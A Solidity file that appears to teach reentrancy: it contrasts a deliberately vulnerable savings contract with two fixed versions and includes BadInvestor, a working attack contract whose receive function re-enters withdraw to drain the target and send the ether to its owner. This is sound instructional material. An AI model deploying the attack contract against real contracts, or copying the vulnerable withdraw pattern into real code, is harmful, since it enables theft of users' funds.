// SPDX-License-Identifier: NONE
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract VulnerableSavingsAccount {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountDeposited = balanceOf[msg.sender];

        require(address(this).balance >= amountDeposited, "Not enough balance");
        (bool success, ) = payable(msg.sender).call{value: amountDeposited}("");
        require(success, "Unable to send value");

        // For EOA this is fine, but if a contract re-enters in this function,
        // then it is a problem
        balanceOf[msg.sender] = 0;
    }
}
contract SecureSavingsAccount {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external {
        require(balanceOf[msg.sender]>0,"Nothing to withdraw");

        uint256 amountDeposited = balanceOf[msg.sender];

        balanceOf[msg.sender] = 0;

        require(address(this).balance >= amountDeposited, "Not enough balance");
        (bool success, ) = payable(msg.sender).call{value: amountDeposited}("");
        require(success, "Unable to send value");
    }
}
contract GuardedSavingsAccount is ReentrancyGuard {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable nonReentrant{
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant{
        require(balanceOf[msg.sender]>0,"Nothing to withdraw");

        uint256 amountDeposited = balanceOf[msg.sender];

        

        require(address(this).balance >= amountDeposited, "Not enough balance");
        (bool success, ) = payable(msg.sender).call{value: amountDeposited}("");
        require(success, "Unable to send value");

        balanceOf[msg.sender] = 0;
    }
}

interface ISavingsAccount {
    function deposit() external payable;

    function withdraw() external;
}

contract BadInvestor is Ownable {
    ISavingsAccount private savingsAccount;

    constructor(address _savingsAccount) {
        savingsAccount = ISavingsAccount(_savingsAccount);
    }

    function attack() external payable onlyOwner {
        savingsAccount.deposit{value: msg.value}();
        savingsAccount.withdraw();
    }
    function updateSavingsAccount(address _savingsAccount) public onlyOwner{
        savingsAccount = ISavingsAccount(_savingsAccount);
    }

    receive() external payable {
        if (address(savingsAccount).balance > 0) {
            savingsAccount.withdraw();
        } else {
            payable(owner()).transfer(address(this).balance);
        }
    }
}

